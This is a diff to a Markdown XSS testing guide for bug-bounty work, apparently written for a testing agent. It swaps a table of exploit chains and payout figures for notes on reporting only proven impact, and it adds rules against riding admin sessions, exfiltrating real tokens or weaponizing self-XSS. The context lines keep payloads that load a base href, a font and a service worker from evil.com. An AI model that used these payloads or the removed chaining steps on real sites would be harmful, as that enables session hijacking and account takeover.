@@ -42,16 +42,22 @@ Base: <base href="https://evil.com/">  Font: @font-face{src:url('https://evil.co
 Service Worker: navigator.serviceWorker.register('https://evil.com/sw.js')
 ```
 
-## CHAINS
+## COMPOUND RISK (note it, don't stage it)
 ```
-Reflected XSS + cookie theft → Session hijack → ATO       ($500 → $50K)
-Stored XSS + admin panel → Privilege escalation → Critical ($1K → $50K)
-DOM XSS + OAuth flow → Token theft → ATO                   ($500 → $50K)
-Self-XSS + CSRF → Trigger on victim → ATO                  ($200 → $10K)
+Reflected XSS + cookie theft      → note: session impact depends on cookie flags
+Stored XSS + admin views content  → note: would reach privileged users
+DOM XSS + OAuth flow              → note: token exposure depends on flow
+Self-XSS + CSRF                   → note: needs a delivery vector to matter
 ```
+
+Report the XSS you proved, at the severity its **actual** impact supports.
+Check the cookie flags (`HttpOnly` is the norm) and say what is reachable;
+do not attempt to ride an admin session or exfiltrate a real token to make the
+report look bigger. If cookie theft is genuinely possible, one demonstration
+against your own test account is the whole proof.
 
 ## FALSE POSITIVES
 - Payload HTML-encoded (`&lt;`) → not XSS
 - In JS string (needs different escape) → not XSS
-- Self-XSS only → need to demonstrate on ANOTHER user
-- CSP blocks execution → not XSS
+- Self-XSS only → **not reportable** (Gate 6); do not try to weaponize delivery
+- CSP blocks execution → not XSS (report the CSP gap separately, if at all)
